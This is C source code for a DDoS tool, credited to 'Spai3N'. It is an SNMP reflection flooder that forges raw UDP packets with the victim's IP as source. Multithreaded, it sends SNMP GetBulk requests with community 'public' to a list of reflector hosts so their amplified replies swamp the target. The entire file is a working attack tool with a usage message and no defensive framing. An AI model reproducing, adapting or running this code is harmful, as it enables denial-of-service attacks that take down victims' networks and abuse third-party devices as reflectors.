/* SNMP DDOS SCRIPT by Spai3N v1.0 */

#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9

struct sockaddr_in dest;
char *source;
int port;
int sok;
char snmpkill[] =
"\x30\x24\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x17\x02"
"\x04\x7b\x73\xcc\x13\x02\x01\x00\x02\x01\x64\x30\x09\x30\x07\x06"
"\x03\x2b\x06\x01\x05";

struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};
struct list *head;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };

in_cksum (unsigned short *ptr, int nbytes)
{
	register long sum;		
	u_short oddbyte;
	register u_short answer;	
	sum = 0;
	
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	
	if (nbytes == 1)
	{
	  oddbyte = 0;		
	  *((u_char *) & oddbyte) = *(u_char *) ptr;	
	  sum += oddbyte;
	}
	
	sum = (sum >> 16) + (sum & 0xffff);	
	sum += (sum >> 16);	
	answer = ~sum;		
	return (answer);
}
 
void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	struct  list *list_node = td->list_node;
	int i=0;
	while(1)
	{
		if(sendit(list_node->data.sin_addr.s_addr) == -1) printf ("SENDING ERROR!\n");
		list_node = list_node->next;
		if(i==5)
		{
				usleep(0);
				i=0;
		}
		i++;
	}
}

int sendit(ulong destaddr)
{
	struct pseudoudp {
	u_long ipsource;
	u_long ipdest;
	char zero;
	char proto;
	u_short length;
	} *psudp;
	struct in_addr sourceip_addr;
	struct in_addr destip_addr;
	struct ip          *IP;
	struct udphdr      *UDP;
	char *packet, *packetck, *data;
	int datasize;
	destip_addr.s_addr=destaddr;
	sourceip_addr.s_addr=inet_addr(source);
	dest.sin_addr.s_addr=destip_addr.s_addr;                                                                        
	datasize=sizeof(snmpkill);
	packet = ( char * )malloc( 20 + 8 + datasize );
	IP     = (struct ip     *)packet; 
	memset(packet,0,sizeof(packet)); 
	IP->ip_dst.s_addr  = destip_addr.s_addr;
	IP->ip_src.s_addr  = sourceip_addr.s_addr;
	IP->ip_v = 4;
	IP->ip_hl = 5;
	IP->ip_ttl = 245;
	IP->ip_id = htons(1047);
	IP->ip_p = 17;
	IP->ip_len  = htons(20 + 8 + datasize);
	IP->ip_sum  = in_cksum((u_short *)packet,20);
	UDP   = (struct udphdr    *)(packet+20);
	UDP->source = htons(port);
	UDP->dest   = htons(161);
	UDP->len     = htons(8+datasize);
	UDP->check = 0;
	packetck = (char *)malloc(8 + datasize + sizeof(struct pseudoudp));
	bzero(packetck,8 + datasize + sizeof(struct pseudoudp));     
	psudp = (struct pseudoudp *) (packetck);
	psudp->ipdest = destip_addr.s_addr;
	psudp->ipsource = sourceip_addr.s_addr;
	psudp->zero = 0;
	psudp->proto = 17;
	psudp->length = htons(8+datasize);
	memcpy(packetck+sizeof(struct pseudoudp),UDP,8+datasize);
	memcpy(packetck+sizeof(struct pseudoudp)+8,snmpkill,datasize);
	UDP->check = in_cksum((u_short *)packetck,8+datasize+sizeof(struct pseudoudp));    
	data   = (unsigned char    *)(packet+20+8); 
	memcpy(data,snmpkill,datasize);  
	return(sendto(sok,packet,20+8+datasize,0,(struct sockaddr *) &dest,sizeof(struct sockaddr)));
	free(packet);
	free(packetck);
}

int main(int argc, char *argv[ ])
{
	if(argc < 4){
			fprintf(stderr, "SNMP Attack script v1.0 by Spai3N\nInvalid parameters!\n");
			fprintf(stdout, "Usage: %s <target IP> <target port> <reflection file> <threads> <time (optional)>\n", argv[0]);
			exit(-1);
	}
	int i = 0;
	head = NULL;
	fprintf(stdout, "Setting up Sockets...\n");
	int max_len = 128;
	char *buffer = (char *) malloc(max_len);
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[4]);
	FILE *list_fd = fopen(argv[3],  "r");
	while (fgets(buffer, max_len, list_fd) != NULL) {
			if ((buffer[strlen(buffer) - 1] == '\n') ||
							(buffer[strlen(buffer) - 1] == '\r')) {
					buffer[strlen(buffer) - 1] = 0x00;
					if(head == NULL)
					{
							head = (struct list *)malloc(sizeof(struct list));
							bzero(&head->data, sizeof(head->data));
							head->data.sin_addr.s_addr=inet_addr(buffer);
							head->next = head;
							head->prev = head;
					} else {
							struct list *new_node = (struct list *)malloc(sizeof(struct list));
							memset(new_node, 0x00, sizeof(struct list));
							new_node->data.sin_addr.s_addr=inet_addr(buffer);
							new_node->prev = head;
							new_node->next = head->next;
							head->next = new_node;
					}
					i++;
			} else {
					continue;
			}
	}
	source = argv[1];
	port = atoi(argv[2]);
	dest.sin_family=AF_INET;
	
	if ( (sok=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) < 0)
	{
			printf("Can't create socket.\n");
			exit(EXIT_FAILURE);
	}

	struct list *current = head->next;
	pthread_t thread[num_threads];
	struct sockaddr_in sin;
	struct thread_data td[num_threads];
	for(i = 0;i<num_threads;i++){
			td[i].thread_id = i;
			td[i].sin= sin;
			td[i].list_node = current;
			pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
	}
	fprintf(stdout, "Starting Flood...\n");
	if(argc > 5)
	{
			sleep(atoi(argv[5]));
	} else {
			while(1){
					sleep(1);
			}
	}
	return 0;
}